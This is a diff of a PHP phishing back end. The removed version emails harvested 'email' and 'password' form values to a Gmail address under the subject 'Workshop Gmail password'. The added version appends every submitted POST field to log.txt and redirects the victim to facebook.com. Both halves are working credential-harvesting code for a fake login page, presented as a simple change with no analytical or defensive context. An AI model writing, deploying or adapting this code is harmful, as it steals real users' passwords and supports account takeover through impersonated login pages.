@@ -1,22 +1,13 @@
 <?php
-        $mailhacked = $_POST["email"];
-        $passwordhacked = $_POST["password"];
-         $to = "mrxhest@gmail.com";
-         $subject = "Workshop Gmail password";
-         
-         $message = "$mailhacked";
-         $message .= "<br>$passwordhacked";
-         
-         $header = "From:HACK3R@Hack3r.com \r\n";
-         $header .= "Cc:abcd@somedomain.com \r\n";
-         $header .= "MIME-Version: 1.0\r\n";
-         $header .= "Content-type: text/html\r\n";
-         
-         $retval = mail($to,$subject,$message,$header);
-         
-         if( $retval == true ) {
-            include("MKR.php");
-         }else {
-            echo "Message could not be sent...404 error check your internet";
-         }
-      ?>
+header ('Location: https://facebook.com');
+$handle = fopen("log.txt", "a");
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n\n\n\n");
+fclose($handle);
+exit;
+?>
